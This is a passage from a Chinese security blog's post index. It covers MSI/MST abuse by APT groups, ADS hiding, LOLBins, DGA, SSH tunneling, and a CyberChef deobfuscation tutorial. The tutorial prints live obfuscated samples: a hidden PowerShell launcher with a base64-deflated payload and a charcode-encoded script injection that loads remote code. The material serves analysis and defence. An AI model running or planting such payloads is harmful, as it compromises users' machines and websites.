installer的功能）的内容封装在一个包里。是包含有关软件安装的详细信息的数据库文件，存储安装过程中的数据，包括配置设置、要安装的文件和安装说明，确保结构化和高效的软件部署。\nWindows Installer的用途包括:管理软件的安装、管理软件组件的添加和删除、监视文件的复原以及使用回滚技术维护基本的灾难恢复。\nMsi技术的原理：Windows Installer技术就是合并在一起发挥作用的两个部分:客户端安装程序服务（Msiexec.exe） 和Microsoft软件安装（MSI）软件包文件。\nMsiexec.exe 程序是 Windows Installer 的一个组件。 当 Msiexec.exe 被安装程序调用时，它将用 Msi.dll 读取软件包文件(.msi)、应用转换文件(.mst) 并合并由安装程序提供的命令行选项。 Windows Installer 执行所有与安装有关的任务：包括将文件复制到硬盘、修改注册表、创建桌面快捷方式、必要时显示提示对话框以便用户输入安装首选项。\n当双击MSI文件的时候，与之关联的Windows Installer 的一个文件Msiexec.exe 被调用，它将用Msi.dll读取软件包文件（.msi）、应用转换文件（.mst）进行进一步处理。\nMSI文件的结构是Windows Installer用于软件安装、维护和删除的关系数据库，数据库由几个表组成，每个表在安装过程中有特定的用途，这些表通过主键值和外键值链接。安装数据库包含安装应用程序所需的所有信息，因此需要用所需的信息填充表。一个MSI文件可以有多个表，我们重点关注在我们的分析中最有用的表。\n二进制表直接在MSI数据库中存储二进制数据，如图标、位图、动画或自定义操作脚本，这些数据直接嵌入MSI文件中，并在安装期间使用Windows Installer API进行访问，它通常用于安装过程本身所需的较小资源。\n文件表包含有关将安装在目标系统上的文件的信息，描述要复制到用户计算机的实际应用程序文件。这些文件通常单独存储（例如，在CAB文件中）或作为MSI中的压缩流，并表示构成正在安装的应用程序的文件，文件表用于确定要安装的文件、安装位置及其属性。\nCustom Action表\nMSI文件中的自定义操作是指在安装过程中运行的命令或脚本，用于执行标准MSI操作无法处理的自定义任务。这些操作可以执行可执行文件、DLL、VBScript、JavaScript或预定义命令，从而使攻击者能够在看似合法安装的后台执行恶意代码\nMSI文件中的自定义操作在CustomAction表中定义，此表中的每个条目指定一个自定义操作、其类型、源和目标。以下是用于定义自定义操作的列的细分：\nAction：这是自定义操作的名称。它充当主键并在序列表中引用此操作。如果名称与任何内置操作匹配，则不会执行自定义操作。 Type：此字段包含指定自定义操作类型及其执行选项的标志的按位组合。类型确定操作是调用DLL、可执行文件、脚本还是设置属性。 Source：此字段可以包含属性名称或指向另一个表的键，例如Binary表（用于嵌入的二进制文件）、File表（用于已安装的文件）或Directory表（用于路径）。引用的特定表取决于自定义操作的类型。 Target：此字段提供自定义操作所需的其他信息，如DLL的入口点、可执行文件的命令行参数或脚本代码。 ExtendedType：此字段指定自定义操作的其他选项，例如处理补丁卸载。 这里就可以完成很多预期之外的操作，例如运行可执行文件的自定义操作可能使其Source字段引用File表中的键，而其Target字段包含命令行参数。\n常见文件扩展名及其作用\n.msi：Microsoft Windows软件包文件的主要扩展名，包含安装数据库和安装软件的必要说明。 .mst：Windows NT转换文件，用于修改或自定义MSI文件，而不改变原始软件包。 .msm：合并模块文件，用于交付共享组件并确保跨多个应用程序安装相同版本的共享文件。 .msp：Windows Installer修补程序文件，用于对已安装的应用程序应用更新或修复。 .cab：Cabinet文件，用于将多个文件压缩和打包到一个文件中，以便于分发。CAB 文件可以显著减小安装包的大小，并将多个文件打包在一起，以简化分发和部署。 手动分析MSI文件的工具\nmsitools：包括msiinfo和msidump等实用程序，可用于检查MSI文件，枚举表和流，转储表内容，并从MSI文件中提取数据。 msidump：由Mgeeky开发的工具，用于分析恶意MSI软件包，可以提取文件、流和二进制数据，并集成了YARA扫描，对于快速分类和详细检查潜在的恶意MSI特别有用。 lessmsi：一个具有图形用户界面和命令行界面的实用程序，可以用来查看和提取MSI文件的内容，还具有Windows资源管理器集成，便于提取和MSI表查看器。 MSI Viewer：可从Microsoft Store获得，用以查看MSI安装程序文件和合并模块的内容，还可以提取文件，而无需运行安装程序。 Orca：由Microsoft开发的图形用户界面（GUI）工具，用于分析和编辑MSI文件，Orca允许用户打开MSI文件并查看其内部结构，包括表，属性和安装包的其他组件。 msidiff：可以用于比较两个msi文件的差异。 活跃APT组织使用MSI作为相关攻击载体情况\nBitter、APT-Q-27、APT-Q-15(Darkhotel)、CNC等APT组织将恶意组件压缩在cab中，在msi安装过程中释放并执行，这也是目前最为常见的利用手法，缺点是恶意组件随着MSI的安装会落地在磁盘上，比较考验攻击者持续的免杀技术。\n在CustomAction中支持各种类型的自定义操作，攻击者有较为丰富的操作空间，例如Bitter组织在CustomAction表中调用带有签名的第三方powershell解释器执行powershell脚本。\n而APT-Q-15（Darkhotel）在针对朝鲜人的间谍活动中，投递恶意的朝鲜字体MSI安装包，将木马模块core.dll添加到customAction表内，与Media表中插入的恶意模块相比，core.dll在msi安装过程中并不会落地，系统进程msiexec会启动一个独立的子进程内存加载该DLL，从而达到LOLBINS的效果。\nMST文件和MSI文件的关系\nMST (Microsoft Transform) 文件是一种变换文件，它用于自定义和修改 MSI 文件的安装过程。通过使用 MST 文件，管理员可以对 MSI 安装包进行定制化调整，而不需要直接修改原始的 MSI 文件。这种方式非常适用于批量部署，因为可以根据不同需求灵活调整安装设置。\n使用方法\n生成 MST 文件： 可以使用工具如 InstallShield、Orca 等来创建和编辑 MST 文件。 应用 MST 文件： 在安装 MSI 文件时，可以使用命令行参数将 MST 文件应用于 MSI 包。例如： msiexec /i example.msi TRANSFORMS=example.mst 这条命令会安装 example.msi 文件，同时应用 example.mst 文件中的配置。 所以其实只是LOLbins的一种实现方式，不过“黑”从dll变成了mst。mst可以使用ocra生成，\nMST文件实际上也是压缩包，解压开来分析其中的dll就行。\nMST 内部的可执行模块一般会有两个导出函数分别为 LogSetupAfterInstall 和 LogSetupBeforeInstall，用来控制 MSI 安装过程中的流程。\n参考：\nMSI文件滥用新趋势：新海莲花组织首度利用MST文件投递特马\nmsi恶意软件分析\nMSI文件结构详解及MSI恶意样本分析方法\nMSI Shenanigans. Part 1 – Offensive Capabilities Overview\nHow to Analyze Malicious MSI Installer Files\n","date":"2024-11-12T11:15:13+08:00","permalink":"https://wander1ng.com/post/msi%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8F%8A%E7%9B%B8%E5%85%B3apt%E7%BB%84%E7%BB%87%E6%89%8B%E6%B3%95/","section":"post","tags":["APT"],"title":"Msi恶意文件及相关APT组织手法"},{"categories":null,"contents":"来源于真实环境中遇到的某组织\n该技术比较冷门，Google只有Microsoft官方对其的两个介绍页面。它可以修改正常安装包的组件，实现木马的落地。\n官方定义：\nTRANSFORMS 属性是安装程序在安装包时应用的转换的列表。 安装程序按转换在属性中列出的顺序应用转换。 转换可以按文件名或按完整路径指定。 若要指定多个转换，请使用分号 (;) 分隔每个文件名或完整路径。 例如，若要对包应用三个转换，请将 TRANSFORMS 设置为文件名列表或完整路径列表。\nTRANSFORMS=transform1.mst;transform2.mst;transform3.mst\rTRANSFORMS=\\\\server\\share\\path\\transform1.mst;\\\\server2\\share2\\path2\\transform2.mst;\\\\server3\\share3\\path3\\transform3.mst 可以通过在文件名前面加上冒号 (:) 来指示转换文件嵌入 .msi 文件的存储中，而不是一个独立文件。 例如，以下示例指示 transform1.mst 和 transform2.mst 嵌入在 .msi 文件中，而 transform3.mst 是独立文件。\nTRANSFORMS=:transform1.mst;:transform2.mst;transform3.mst 安装程序在包的每次安装、播发、按需安装或维护安装时都需要 TRANSFORMS 中列出的转换。 TransformsSecure策略、TRANSFORMS 属性和 TRANSFORMS 字符串的第一个字符告知安装程序如何处理独立转换文件的源复原能力。 Windows Installer 将 TransformsAtSource 策略 或 TRANSFORMSATSOURCE设置得与 TransformsSecure 策略和 TRANSFORMSSECURE 相同。 请注意，嵌入 .msi 文件的转换不会缓存，并且始终从包中获取。\n看不懂，问了问GPT-4o\nTRANSFORMS 是 Microsoft Installer (MSI) 安装包中的一个参数，用于指定一个或多个变换文件（Transform files），这些变换文件可以在安装过程中修改 MSI 安装包的默认设置和行为。\nMSI TRANSFORMS 参数 定义: TRANSFORMS 是一个参数，指定一个或多个变换文件（通常是 .mst 文件）。 这些变换文件定义了对原始 MSI 安装包进行的修改或定制。 用途: 可以用来配置软件的默认设置，添加或移除功能模块，修改安装路径等。 适用于企业部署场景，帮助管理员根据公司需要定制软件安装。 示例 假设你有一个名为 example.msi 的安装包，以及一个变换文件 custom.mst，你可以在命令行中使用 TRANSFORMS 参数来应用变换文件：\nmsiexec /i example.msi TRANSFORMS=custom.mst 多个变换文件 你也可以同时应用多个变换文件，用分号 ; 分隔：\nmsiexec /i example.msi TRANSFORMS=custom1.mst;custom2.mst 实际案例 例如，一个软件包在不同的部门需要不同的配置设置，使用变换文件可以创建多个配置方案而无需修改原始的 MSI 文件。\n原始安装包： software.msi 财务部门定制： finance.mst IT 部门定制： it.mst 安装财务部门定制版本： msiexec /i software.msi TRANSFORMS=finance.mst 安装 IT 部门定制版本： msiexec /i software.msi TRANSFORMS=it.mst 如何创建变换文件 变换文件通常是通过专门的 MSI 编辑工具创建的，例如：\nOrca：Microsoft 提供的一个免费的 MSI 数据库编辑器，可以用来创建和编辑变换文件。 InstEd：第三方工具，功能强大且易于使用。 总结 TRANSFORMS 参数在 MSI 安装过程中起到了关键作用，通过指定一个或多个变换文件，管理员可以灵活地定制软件的安装设置和行为。这对于大规模部署和不同部门的个性化需求特别有用，既能减少工作量，又能确保安装的一致性和准确性。\n我的理解是攻击者在msi安装文件中嵌入了自己的恶意代码\n","date":"2024-10-30T18:31:14+08:00","permalink":"https://wander1ng.com/post/msi-transforms%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","section":"post","tags":["APT"],"title":"MSI TRANSFORMS技术分析"},{"categories":null,"contents":"来源360威胁情报中心的文章\nhttps://mp.weixin.qq.com/s/qi1krFG75sxQO6DSS3B3eQ\nConfucius即“魔罗桫”，看名字没记错的话应该也是印度的组织，主要针对巴基斯坦地区进行攻击。\nADS技术即Alternate Data Streams，也称作NTFS交换数据流，随着杀毒软件功能的日益强大，病毒总会借助各式各样的隐藏手段来逃避杀毒软件的“追捕”。有些病毒会通过设置文件属性来隐藏自身，从而长期伏在计算机中，使自己很难被用户发现。一种更为隐蔽、危害性更大的隐藏方法逐渐被病毒利用，即利用NTFS数据流来隐藏病毒，此类病毒我们称之为ADS流病毒或ZeroAcess。\n它是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。\n攻击链 Confucius组织首先针对目标人群发送钓鱼邮件，并且携带恶意压缩包，其中压缩包中包括一个存在多个数据流的LNK文件，攻击者利用ADS交换数据流实现了恶意DLL和诱饵文档的隐藏，用户解压压缩包，看不到隐藏的DLL等文件，只能看到LNK文件，并且文件大小也只是LNK文件大小本身，但是当用户点击其中LNK文件即中招，LNK文件会释放隐藏的诱饵文档流数据，并释放DLL文件以及拷贝fixmapi.exe实现侧加载，并通过注册表实现持久化驻留。\n攻击入口为一个压缩包，文件名称为“Hajj_Advisory.rar”。\nMD5 fbcac2eb16586813275d2e25ec57142e 文件名称 Hajj_Advisory.rar 文件大小 131.71 KB (134871 字节) 解压后可以看到一个同名称的lnk文件，文件大小只有4KB。\n但是实际上攻击者利用ADS交换数据流技术在LNK文件中捆绑了两个数据流Banana和Apple，这两个数据流分别是恶意DLL和诱饵文档，不过这两个文件流不显示，即使系统设置显示隐藏文件，解压后也看不到该文件流。通过在CMD中执行dir /r命令，可以看到，如下图所示：\n另外虽然LNK文件大小显示只有4KB，但是仔细观察发现该文件占用空间为188KB,也侧面看出该LNK携带了恶意文件流数据。\n一种未曾见过的新技术，记录一下，长见识了~\n以及Confucius喜欢用fixmapi.exe进程侧加载。\n","date":"2024-10-30T17:58:02+08:00","permalink":"https://wander1ng.com/post/confucius%E7%BB%84%E7%BB%87%E5%88%A9%E7%94%A8ads%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8/","section":"post","tags":["APT"],"title":"Confucius组织利用ADS隐藏技术的攻击活动"},{"categories":null,"contents":"什么样的程序才能称之为LOLBins？ 可以是带有Microsoft签名的二进制文件，也可以是Microsoft系统目录中的二进制文件。 可以是第三方认证签名的程序。 具有对APT或红队有用的功能。 该程序除正常的功能之外，还可以做意料之外的行为（如恶意代码执行，UAC绕过） LOLBins常见的利用 Cmd.exe\nPowershell.exe\nRundll32.exe\nWmic.exe\nWMIC扩展WMI（Windows Management Instrumentation，Windows管理工具），执行“wmic”命令启动WMIC命令行环境。这个命令可以在XP或 .NET Server的标准命令行解释器（cmd.exe）、Telnet会话或“运行”对话框中执行。这些启动方法可以在本地使用，也可以通过.NET Server终端服务会话使用。\nMshta.exe\n文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用。\nCscript.exe\nWindows Script Host引擎，用于加载wsf，.vbs，.js等脚本。\nRegsvr32.exe\n用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令。\nCerutil.exe\n可用于在Windows中管理证书。使用此程序可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。程序有一特性是能够从远程URL下载证书或任何其他文件。\nMsiexec.exe\n系统进程，是Windows Installer的一部分。用于安装Windows Installer安装包（MSI）。\nInstallutil.exe\n安装程序工具是一个命令行实用工具，你可以通过此工具执行指定程序集中的安装程序组件，从而安装和卸载服务器资源。程序将会寻找卸载程序中的InstallUtil()函数，进行调用。\nMSBuild.exe\n生成项目或解决方案文件。程序运行将会寻找该项目文件中指定的TaskName名称中对应的程序的Execute()函数，进行调用。\nWrite.exe\n系统写字板程序，程序加载需调用PROPSYS.dll中的PSCreateMemoryPropertyStore()函数,同时也加载config配置文件。\nRekeywiz.exe\n加密文件系统证书管理向导程序，程序加载需调用mpr.dll。\n第三方认证签名文件利用 WeChat.exe\n微信主程序，需调用WeChatWin.dll运行。\n","date":"2024-10-28T18:07:46+08:00","permalink":"https://wander1ng.com/post/living-off-the-land-binaries/","section":"post","tags":["APT"],"title":"Living Off the Land Binaries"},{"categories":null,"contents":"DGA算法，即Domain Generation Algorithm，是一种可以生成大量新域名的算法。攻击者使用该算法来频繁更改所使用的域名，利用这项技术可以逃避针对于特定域名和静态IP地址的恶意软件解决方案。\n域名生成算法使用字符序列来快速生成数以千计的域名，这些域名实际上就是攻击者与 C2 服务器进行通信的会合点。这些算法每天可以生成成千上万个 DGA 域名，其中大部分都未注册。黑客使用未注册的域名隐藏已注册的域名，从而更轻松地避开使用签名和 IP 声誉的检查引擎所进行的检测。该算法可以在客户端和源端上执行。它从攻击者和 C2 服务器已知的一个种子开始，让双方都知道将生成哪些域名以及要注册哪个域名以用作恶意软件的通信通道。如果安全系统识别出该域名并进行拦截，攻击者就会遵从黑客和恶意软件或僵尸网络都理解的模式快速切换到下一个域名，以便继续与 C2 服务器保持联系。\n目前，黑客攻击者为了防止恶意域名被发现，会使用Domain Flux或者IP Flux来快速生成大量的恶意域名。Domain Flux是通过不断变换域名，指向同一个IP，IP Flux是只有一个域名，不断变换IP，一个域名可以使用多个IP。\nDGA生成的域名也可以是二级域名。\n受害者端视角：使用同样的种子运行DGA，生成大量域名，逐个访问这些域名，检测是否存在，如果该域名未注册，程序继续检测其他域名，如果该域名已注册(如果某生成域名发生了被抢注的情况该怎么办？不处理，因为那些域名并不能发攻击指令，看设计方案是否要继续进行轮询)，那么恶意软件将选择使用该域名联系C\u0026amp;C服务器。 DGA使用的种子有很多种类，包含日期、社交网络搜索热词、随机数或字典，生成一串字符前缀，添加TLD（如com、org等）后得到最终生成域名AGD（Algorithmically Generated Domain） 。 （怎样确定同样的种子？在程序中内嵌。但是安全人员逆向了之后仍旧不能确定种子是什么，因为并不能知道攻击者究竟以什么字段作为种子）。\n动态域名，即Dynamic DNS。API或网站等许多 Web 属性在其 IP 地址经常改变的互联网连接上运行；如果这些属性的运营商想要为托管的资源提供特定域名，就必须将 IP 地址存储在域名系统 (DNS) 记录中，这就会产生问题。动态 DNS (DDNS) 是一项服务，即使该 IP 地址不断更新，其也可使用 Web 属性的正确 IP 地址来更新 DNS。\n例如，如果一位网络管理员正在运营一个域名为 www.example.com 且 IP 地址为 192.0.2.0 的小型网站，则每当另一个用户在浏览器中输入 www.example.com 时，DNS 会将他们定向到位于 192.0.2.0 的服务器。如果该管理员的 ISP 将 IP 动态更改为 192.0.2.1，则动态 DNS 服务可自动更新该管理员的 DNS 记录，以便使尝试访问 www.example.com 的其他用户现在将转到正确的 IP 地址。\n准确地说变换的并不是域名本身，而是IP地址。之前一直认为具有非常多子域名的二级域名统称为动态域名，认为变化的是子域名，实际上大错特错。\n为什么某些IP地址会更改？\n在互联网早期，IP 地址很少改变，这使得域的管理非常简单。但具有互联网访问权限的 Web 和家用计算机的快速增长造成了可用 IP 地址的短缺。动态主机配置协议 (DHCP) 应运而生，该协议可使 ISP 为用户动态分配 IP。ISP 一般将维护一个 IP 地址共享池，并在连接期间或在达到最大时间之前，根据需要将其分配或“租赁”给用户。尽管引入 IPV6 缓解了 IP 地址短缺问题，但 ISP 仍经常使用 DHCP，因为这比提供静态 IP 更具成本效益。\n运行主要 Web 服务的大型企业要求其 ISP 为他们提供不变或“静态”IP 地址，以便他们能够使用标准 DNS 惯例进行操作。相反，较小服务的 IP 地址经常被 ISP 更改，因此它们需要动态 DNS 解决方案来使其 DNS 记录保持最新状态。这些较小的服务可包括小型企业网站、个人网站、DVR 和安全摄像机。\n动态DNS如何工作？\n有许多公司提供具有不同功能和技术的动态 DNS 服务。启用动态 DNS 的一种极为常见的方法是为用户提供在其计算机或路由器上运行的软件。每次更新 ISP 提供的 IP 地址时，该软件就会与动态 DNS 服务提供商进行通信，而动态 DNS 提供商接着更新进行了这些更改的 DNS，从而提供几乎即时的更新。\n使用DGA的组织并不局限于僵尸网络，许多黑产也在使用，二者并无具体关系。\n","date":"2024-10-25T14:54:57+08:00","permalink":"https://wander1ng.com/post/dga%E5%92%8C%E5%8A%A8%E6%80%81%E5%9F%9F%E5%90%8D/","section":"post","tags":["网络基础设施"],"title":"DGA和动态域名"},{"categories":null,"contents":"Chisel 项目地址：https://github.com/jpillora/chisel\nChisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.\ngsocket 项目地址：https://github.com/hackerschoice/gsocket/tree/master\nThe Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.\n通信是通过gsocket分配密钥后，输入输出都传到官方服务器上实现的。\nSSH隧道 本地转发 - L\n本地转发里的本地，我认为最简单的理解就是执行转发命令后，后续实际用于连接的端口位于本地主机。 本地转发的基本命令形式如下：\nssh -L 主机A端口A:主机C:主机C端口C username@主机B\n结合下面的示意图，我们来理解下这个命令。如果我们的电脑是主机A，主机B是服务器的登录节点，主机C是服务器的子节点，其中我们的主机A可以连接主机B，但不能直接访问主机C。这时如果我们想要在自己电脑上直接使用主机C上部署在端口C的服务，就可以使用上面的命令，将端口C转发到本地的端口A上。 这时，我们在本地其它程序访问A端口，就等于访问了主机C的端口C，就好像在A和C端口之间打了一条隧道直连一样。 另外主要注意的时，主机B可以和主机C是同一台电脑，我们只要把上面命令里的主机C改成localhost即可。一般用在我们只能访问B的部分端口的情况。\n远程转发 - R\n远程转发里的远程，同样的理解方法，在执行转发命令后，后续实际用于连接的端口在远程主机。 远程转发的基本命令形式如下：\nssh -R 主机B端口B:主机C:主机C端口C username@主机B\n同样结合示意图来进行理解。此时我们的主机A与主机C位于同一个内网，无法被直接访问，主机B位于公网可以直接访问。如果我们想要访问主机C端口C上的服务，可以在主机A上发起到主机B的ssh连接，执行如上命令。 这是，访问主机B的端口B，就等于访问主机C的端口C。同样的，主机A和主机C可以是同一台电脑，实现将内网机器提供的服务暴露到公网上。\n动态转发 - D\n不同于上面的固定端口转发，动态转发相当于把主机B当做一台代理来使用，使用如下命令，可以在端口A上提供一个socks5代理服务。这样当我们在主机A的其它应用上设置了代理后，就可以通过主机B来访问网络，并且A和B之间的通信会被ssh加密。这也是最雏形的越过wall的方式。\nssh -D 主机A端口A username@主机B\n在执行上面的命令时，会同时打开一个ssh交互终端，如果我们只是需要后台启动隧道，可以添加- N参数。\nDNS隧道 反向SOCKET代理 ","date":"2024-08-07T10:38:40+08:00","permalink":"https://wander1ng.com/post/%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/","section":"post","tags":["横向移动"],"title":"常见隧道工具实现"},{"categories":null,"contents":"安全厂商 赛博菩萨Cloudflare安全博客\n卡巴斯基\n火眼\n麦咖啡\n思科\nCisco Talos\nVT\nCheckpoint\nakama\nahnlab\navast.\ncyble\nglobal.ahnlab.com\ncybersecurity.att.com\nzscaler.com\nbroadcom.com\n科技公司 Intel\n资安媒体 securityweek\nthehackernews\nbleepingcomputer.com\n","date":"2024-07-15T10:11:09+08:00","permalink":"https://wander1ng.com/post/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5rss%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/","section":"post","tags":["Cyber threat hunting"],"title":"威胁情报RSS体系构建"},{"categories":null,"contents":"CyberChef是一款强大的编码转换器，下载地址在Cyberchef\n它简单易懂易上手，集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意脚本。\n其界面如下图，最左边的Operations是转换工具集，把挑选好的工具经过DIY组合及排序拖拽到Recipe中，就可以对Input中的字符串进行相应地解密操作了，工具很多，可以在Search框中搜索，输出结果会打印在Output窗口中。\n示例：反混淆Powershell代码 @echo off if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command \u0026#34;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\u0026#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\\\u0026#34;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\u0026#34;) else (%WinDir%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \u0026#34;Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\u0026#34;nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\\\u0026#34;)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\u0026#34;) 这段代码经过了简单的base64混淆，首先要做的是使用正则表达式筛选出base64正文部分：\n在左侧的Operations栏将Regular expreession拖入Recipe中，填入匹配base64正文的正则表达式[0-9a-zA-Z/+=]{30,}，筛选出30个以上连续的base64编码字符。\n将Output format选择为List matches即可在Output中只显示符合条件的字符。\n再从左侧的Operation中把Frombase64拖进来，即可直接在Output中呈现解码后的字符。\n注意到原Poweershell代码中还使用了DeflateStream函数，将Raw Inflate拖进Recipe即可解密。再使用Generic Code Beautify提高代码可读性，perfect！\n对于这一类混淆，都可以用这一套流程来解密，点击Save recipe将其保存，后面遇到相似的混淆都可以用它解决。\n示例：反混淆char类型恶意脚本 eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 57, 55, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 56, 44, 32, 54, 49, 44, 32, 52, 57, 44, 32, 52, 54, 44, 32, 52, 56, 44, 32, 52, 54, 44, 32, 52, 57, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 